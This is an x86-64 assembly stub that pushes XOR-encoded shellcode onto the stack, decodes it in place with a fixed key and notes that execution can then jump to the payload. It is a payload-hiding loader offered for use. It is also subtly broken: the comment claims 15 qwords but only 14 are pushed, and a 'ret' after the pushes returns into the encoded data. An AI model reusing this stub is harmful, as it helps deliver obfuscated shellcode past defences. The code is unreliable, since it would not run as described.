global _start

section .text
_start:
    call load_shellcode
    call decode_shellcode
    ; now you can jump to shellcode or exit
    call exit

load_shellcode:
    ; push 15 qwords (each 8 bytes) onto the stack
    mov rax, 0xa284ee5c7cde4bd7
    push rax
    mov rax, 0x935add110510849a
    push rax
    mov rax, 0x10b29a9dab697500
    push rax
    mov rax, 0x200ce3eb0d96459a
    push rax
    mov rax, 0xe64c30e305108462
    push rax
    mov rax, 0x69cd355c7c3e0c51
    push rax
    mov rax, 0x65659a2584a185d6
    push rax
    mov rax, 0x69ff00506c6c5000
    push rax
    mov rax, 0x3127e434aa505681
    push rax
    mov rax, 0x6af2a5571e69ff48
    push rax
    mov rax, 0x6d179aaff20709e6
    push rax
    mov rax, 0x9ae3f152315bf1c9
    push rax
    mov rax, 0x373ab4bb0900179a
    push rax
    mov rax, 0x69751244059aa2a3
    push rax

    mov rbx, 0x2144d2144d2144d2  ; XOR key in rbx
    ret

decode_shellcode:
    ; rcx = count of 8-byte chunks to decode
    mov rcx, 15

    ; rdi points to the first pushed qword on the stack (lowest pushed address)
    mov rdi, rsp

decode_loop:
    mov rax, [rdi]        ; load 8 bytes from stack
    xor rax, rbx          ; xor with key
    mov [rdi], rax        ; write back decoded 8 bytes
    add rdi, 8            ; move to next qword
    loop decode_loop

    ret

exit:
    mov rax, 60           ; syscall: exit
    xor rdi, rdi          ; exit code 0
    syscall

